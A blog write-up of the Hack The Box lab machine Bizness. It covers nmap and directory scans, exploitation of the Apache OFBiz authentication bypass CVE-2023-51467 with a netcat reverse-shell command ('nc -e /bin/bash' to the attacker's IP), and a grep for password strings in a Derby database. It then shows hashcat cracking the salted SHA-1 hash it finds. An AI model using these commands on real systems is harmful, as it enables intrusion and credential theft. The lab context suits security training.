---
title: HTB Writeup - Bizness
date: 2024-01-11 14:28:47 +07:00
modified: 2024-01-11 14:28:47 +07:00
tags: [hackthebox, linux, boot2root, rce]
description: All the services are free, a source code this site placed on github repository and intergration with netlify service, another service that you can use is github page for hosting your own static site.
---

<img src="/assets/blog-images/htb-bizness/image0.png" alt="bizness">

Hello, this is my first post on this blog. On this first post I'm going to explain the walktrough of the hackthebox machine called Bizness.
First, we do the nmap scanning, to see what are the things that we can look for the foothold.

# Information Gathering
```bash
# Nmap 7.94SVN scan initiated Tue Jan  9 14:22:30 2024 as: nmap -p- -sC -sV -A --min-rate 5000 -o nmap.bizness 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
42235/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/9%OT=22%CT=1%CU=33356%PV=Y%DS=2%DC=T%G=Y%TM=659CF
OS:484%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=2%ISR=10A%TI=
OS:Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M5
OS:52ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88
OS:%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   29.47 ms 10.10.14.1
2   29.62 ms 10.10.11.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  9 14:23:48 2024 -- 1 IP address (1 host up) scanned in 78.61 seconds
```

# Directory Enumaration
After looking at the ports, there's only one thing that we can check which is the web application. When I visit bizness.htb, it automatically direct to `https://bizness.htb/`. Without further do, I just do the fuzzing to see if there is a juicy information that we can use.

```bash
dirsearch -u https://bizness.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/corvuz/hackthebox/bizness/reports/https_bizness.htb/__24-01-09_15-42-52.txt

Target: https://bizness.htb/

[15:42:52] Starting: 
[15:43:04] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[15:43:05] 400 -  795B  - /a%5c.aspx                                        
[15:43:06] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/  
[15:43:23] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/        
[15:43:25] 302 -    0B  - /common  ->  https://bizness.htb/common/          
[15:43:25] 404 -  780B  - /common/config/api.ini                            
[15:43:25] 404 -  779B  - /common/config/db.ini                             
[15:43:25] 404 -  762B  - /common/                                          
[15:43:26] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[15:43:27] 302 -    0B  - /content  ->  https://bizness.htb/content/        
[15:43:27] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[15:43:27] 200 -   34KB - /control/                                         
[15:43:27] 200 -   34KB - /control
[15:43:28] 200 -   11KB - /control/login                                    
[15:43:29] 404 -  763B  - /default.html   
```
Using dirsearch I found a foothold in a form of login page in the directory */control/login* 

<img src="/assets/blog-images/htb-bizness/image1.png" alt="Login Page">

# Vulnerability Analysis
Doing some research on google to get to know about the version whether it's outdated or not.
<img src="/assets/blog-images/htb-bizness/image2.png" alt="sources">

found many resources that talked about the critical cve let's check the first one by [cybersecuritydiver](https://www.cybersecuritydive.com/news/apache-ofbiz-cve-exploitation/703788/)

<img src="/assets/blog-images/htb-bizness/image3.png" alt="cybersecuritydive.com">

We can see that service has outdated version which have vulnerability CVE-2023-51467 that could allowing an attacker to execute arbitrary code without authentication.

# Exploitation
Found this amazing poc that can make us easier to exploit the service. Clone the repository, and run as suggested. Here's the link for [Github](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)

<img src="/assets/blog-images/htb-bizness/image4.png" alt="POC">

Now we able to get the reverse shell using this command:

`python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.59 1337'`

<img src="/assets/blog-images/htb-bizness/image5.png" alt="exploitation">

Good, we got the  user flag

<img src="/assets/blog-images/htb-bizness/image6.png" alt="Use Flag">

# Privilege Escalation
At first I was so confused to find the root and stuck. So I visit HTB forum to get some nudge and insight. Sorry, I'm noob here *sad

So, I able to get some information on this path `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` but when you get into that there's bunch of files, it will takes a long time if you check it one by one.

Therefore, I try to get this information, by using this grep command.

`grep -arin -o -E (\w+\W+){0,5}password(\W+\w+){0,5}' .`

<img src="/assets/blog-images/htb-bizness/image7.png" alt="hash">

This a bit of explanation about the purpose of the command:

    1. `grep`: This command is used for searching text patterns in files.
    
    2. `-a`: This option forces `grep` to treat binary files as text. It can be useful when searching through files that may contain binary data.
    
    3. `-r`: This option makes `grep` search recursively through directories, including subdirectories.
    
    4. `-i`: This option makes the search case-insensitive, meaning it will match "password," "Password," "PASSWORD," etc.
    
    5. `-n`: This option displays the line numbers along with the lines that match the pattern.
    
    6. `-o`: This option prints only the matched parts of a line, rather than the entire line.
    
    7. `-E`: This option enables extended regular expressions, allowing the use of parentheses `{}` for specifying repetition.
    
    8. `'(\w+\W+){0,5}password(\W+\w+){0,5}'`: This is the regular expression being searched for. Let's break it down:
    
        - `(\w+\W+){0,5}`: This part matches up to 5 occurrences of word characters (`\w`) followed by non-word characters (`\W`). This allows for any characters (including spaces, punctuation, etc.) between the beginning of the line and the word "password."
        - `password`**: This is the literal string "password" that the command is searching for.
        - `(\W+\w+){0,5}`: This part matches up to 5 occurrences of non-word characters followed by word characters. This allows for any characters between the word "password" and the end of the line.
    9. `.`: This specifies the current directory as the location to search.

    Big thanks to chatgpt for providing this brief explanation. lol

After we found the hash, we cannot crack it immediately, we need to decode it first using [cyberchef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'_'%7D,'/',false,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false)From_Base64('A-Za-z0-9%2B/%3D',false,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ)

<img src="/assets/blog-images/htb-bizness/image8.png" alt="cyberchef">

Because the hash is in a form of SHA-1 and also it has salt we need to use 120 mode `sha1($salt.$pass)` on hashcat modules.

<img src="/assets/blog-images/htb-bizness/image9.png" alt="Hashcat Module">

This is important thing, append the salt “:d” to crack it with hashcat.

<img src="/assets/blog-images/htb-bizness/image10.png" alt="hashcat">

Using this command: 

`hashcat -a 0 -m 120 hash /home/corvuz/SecLists/Passwords/Leaked-Databases/rockyou.txt` 

Now we cracked the hash and found password.

<img src="/assets/blog-images/htb-bizness/image11.png" alt="Login Page">

now just su and use the password `monkeybizness`, we are rooted.

Thank you, for reading `:))`
 